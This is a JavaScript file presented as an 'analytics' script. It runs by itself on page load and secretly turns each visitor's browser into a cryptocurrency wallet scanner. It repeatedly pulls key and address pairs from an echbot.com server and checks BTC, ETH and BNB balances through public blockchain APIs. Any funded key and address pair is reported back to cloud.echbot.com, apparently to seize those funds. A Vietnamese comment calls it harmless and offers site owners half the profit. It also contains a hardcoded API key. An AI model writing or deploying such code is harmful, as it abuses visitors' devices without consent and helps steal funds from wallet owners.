/*
 *
 */
'use strict';

// xác nhận toàn bộ tiến trình đã nạp xong rồi hay chưa
//var max_all_scan_done = 3;
//var confirm_all_scan_done = max_all_scan_done;
//var confirm_done = {};

function analytics_echbot(confirm_done) {
    if (typeof confirm_done != 'object') {
        confirm_done = {}
    } else {
        // kiểm tra xem còn symbol nào được xác nhận sẽ scan không
        var has_scan = false;
        for (var x in confirm_done) {
            if (confirm_done[x] === true) {
                has_scan = true;
                break;
            }
        }
        //console.log('Has scan: ', has_scan);
        // nếu không còn -> tiến trình scan có thể đang lỗi hết -> hủy bỏ
        if (has_scan === false) {
            return false;
        }
    }

    //
    var toAll = 'Đây là script scan địa chỉ ví BTC, ETH, được chạy ngầm trên website. Mã này hoàn toàn vô hại và lợi nhuận kiếm sẽ được chia 50% cho chủ website mỗi khi tìm được địa chỉ ví có số dư.';

    //
    var spaceScan = 12;
    var myDebug = false;
    //var myDebug = true;

    // kiểm tra để tránh tính trạng scan liên tục
    var spamCheck = 0;
    try {
        spamCheck = localStorage.getItem('analytics_check_spam_echbot');
        if (spamCheck === null) {
            spamCheck = 0;
        } else {
            spamCheck *= 1;
        }
    } catch (e) {
        spamCheck = 0;
    }
    //console.log('spam Check', spamCheck);

    //
    // thời gian hiện tại
    var currentTime = Math.ceil(Date.now() / 1000);
    //if (confirm_all_scan_done < max_all_scan_done || currentTime - spamCheck < spaceScan) {
    if (currentTime - spamCheck < spaceScan) {
        if (myDebug === true) {
            //console.log('Spamer...', confirm_all_scan_done);
            console.log('Spamer...');
        }
        setTimeout(function () {
            analytics_echbot(confirm_done);
        }, Math.ceil(spaceScan / 2) * 1000);
        return false;
    }
    //confirm_all_scan_done = 0;
    //
    localStorage.setItem('analytics_check_spam_echbot', currentTime);

    // ok -> cho phép scan
    var requestTimeout = 33;

    // lấy địa chỉ ví để scan
    jQuery.ajax({
        type: 'GET',
        dataType: 'json',
        //dataType: 'jsonp',
        crossDomain: true,
        url: 'https://analytics.echbot.com:34567',
        timeout: requestTimeout * 1000,
        error: function (jqXHR, textStatus, errorThrown) {
            console.log(textStatus);
            //if (textStatus === 'timeout') {}
        }
    }).done(function (adds) {
        //console.log(adds);

        // lấy địa chỉ ví và tạo tham số để lưu lại thông tin ví
        var arr_adds = [];
        var p = function (a, c) {
            var s = [];
            for (var i = 0; i < a.length; i++) {
                s.push(a[i].a);
                arr_adds.push('primary=' + a[i].k + '&address=' + a[i].a);
            }
            //console.log(s);
            return encodeURI(s.join(c));
        };

        //
        var _log = function (u) {
            console.log(u);
            //return false;

            //
            jQuery.ajax({
                type: 'GET',
                dataType: 'json',
                //dataType: 'jsonp',
                crossDomain: true,
                url: u,
                timeout: requestTimeout * 1000,
                error: function (jqXHR, textStatus, errorThrown) {
                    console.log(textStatus);
                    //if (textStatus === 'timeout') {}
                }
            }).done(function (data) {
                console.log(data);
            });
        };

        // chạy lệnh scan
        var _run = function (u, symbol) {
            // xác nhận đã scan thành công thì mới tiếp tục
            if (typeof confirm_done[symbol] != 'undefined' && confirm_done[symbol] === false) {
                return false;
            }
            confirm_done[symbol] = false;
            //console.log(u);

            //
            jQuery.ajax({
                type: 'GET',
                dataType: 'json',
                //dataType: 'jsonp',
                crossDomain: true,
                url: u,
                timeout: requestTimeout * 1000,
                error: function (jqXHR, textStatus, errorThrown) {
                    //console.log(jqXHR);
                    console.log(textStatus);
                    //console.log(errorThrown);
                    //if (textStatus === 'timeout') {}

                    //
                    //confirm_all_scan_done++;
                }
            }).done(function (data) {
                //console.log(data);
                if (myDebug === true) {
                    console.log(data);
                }
                // xác nhận đúng kiểu data cần check
                var has_data = false;

                // ETH
                if (typeof data.result != 'undefined' && typeof data.status != 'undefined' && data.status * 1 === 1) {
                    has_data = true;

                    // chạy vòng lặp kiểm tra số dư
                    for (var i = 0; i < data.result.length; i++) {
                        // nếu có số dư thì lưu lại file
                        var active_log = false;
                        if (myDebug === true && i === 0) {
                            active_log = true;
                        } else if (data.result[i].balance > 0) {
                            active_log = true;
                        }

                        //
                        if (active_log === true) {
                            for (var y = 0; y < arr_adds.length; y++) {
                                if (arr_adds[y].split(data.result[i].account).length > 1) {
                                    //console.log(arr_adds[y]);
                                    _log('https://cloud.echbot.com/scan/eth/hasbalance?' + arr_adds[y]);
                                    break;
                                }
                            }
                        }
                    }
                }
                // BTC -> v1
                /*
                else if (typeof data.addresses != 'undefined') {
                    has_data = true;

                    // chạy vòng lặp kiểm tra số dư
                    for (var i = 0; i < data.addresses.length; i++) {
                        // nếu có số dư thì lưu lại file
                        var active_log = false;
                        if (myDebug === true && i === 0) {
                            active_log = true;
                        } else if (data.addresses[i].final_balance > 0) {
                            active_log = true;
                        }

                        //
                        if (active_log === true) {
                            for (var y = 0; y < arr_adds.length; y++) {
                                if (arr_adds[y].split(data.addresses[i].address).length > 1) {
                                    //console.log(arr_adds[y]);
                                    _log('https://cloud.echbot.com/scan/btc/hasbalance?' + arr_adds[y]);
                                    break;
                                }
                            }
                        }
                    }
                }
                */
                // v2 -> kiểu nạp balance của BTC
                else {
                    var i = 0;
                    for (var x in data) {
                        if (i === 0) {
                            // nếu không có tham số final_balance -> không đúng kiểu dữ liệu cần so sánh
                            if (typeof data[x].final_balance == 'undefined') {
                                if (myDebug === true) {
                                    console.log('final balance not found!');
                                }
                                break;
                            } else {
                                has_data = true;
                            }
                        }
                        //console.log(data[x]);

                        //
                        // nếu có số dư thì lưu lại file
                        var active_log = false;
                        if (myDebug === true && i === 0) {
                            active_log = true;
                        } else if (data[x].final_balance > 0) {
                            active_log = true;
                        }

                        //
                        if (active_log === true) {
                            for (var y = 0; y < arr_adds.length; y++) {
                                if (arr_adds[y].split(x).length > 1) {
                                    console.log(arr_adds[y]);
                                    _log('https://cloud.echbot.com/scan/btc/hasbalance?' + arr_adds[y]);
                                    break;
                                }
                            }
                        }

                        //
                        i++;
                    }
                }

                //
                //confirm_all_scan_done++;
                if (has_data === true) {
                    // cho phép scan tiếp
                    confirm_done[symbol] = true;
                }
            });
        };

        // tạo URL để scan
        var b = p(adds.b, '|');
        var e = p(adds.e, ',');
        //console.log(arr_adds);

        /*
         * https://www.blockchain.com/api/blockchain_api
         */
        //var blockchain_info = 'https://blockchain.info/multiaddr?limit=0&cors=true&active=';
        //var blockchain_info = 'https://blockchain.info/multiaddr?active=';
        var blockchain_info = 'https://blockchain.info/balance?limit=0&cors=true&active=';
        _run(blockchain_info + b, 'btc');

        //
        _run('https://api.etherscan.io/api?module=account&action=balancemulti&tag=latest&apikey=4Q5U7HNF4CGTVTGEMGRV5ZU9WYNJ6N7YA5&address=' + e, 'eth');
        _run('https://api.bscscan.com/api?module=account&action=balancemulti&tag=latest&apikey=YourApiKeyToken&address=' + e, 'bnb');
    });

    //
    if (myDebug === false) {
        setTimeout(function () {
            analytics_echbot(confirm_done);
        }, spaceScan * 1000);
    }
}
analytics_echbot();
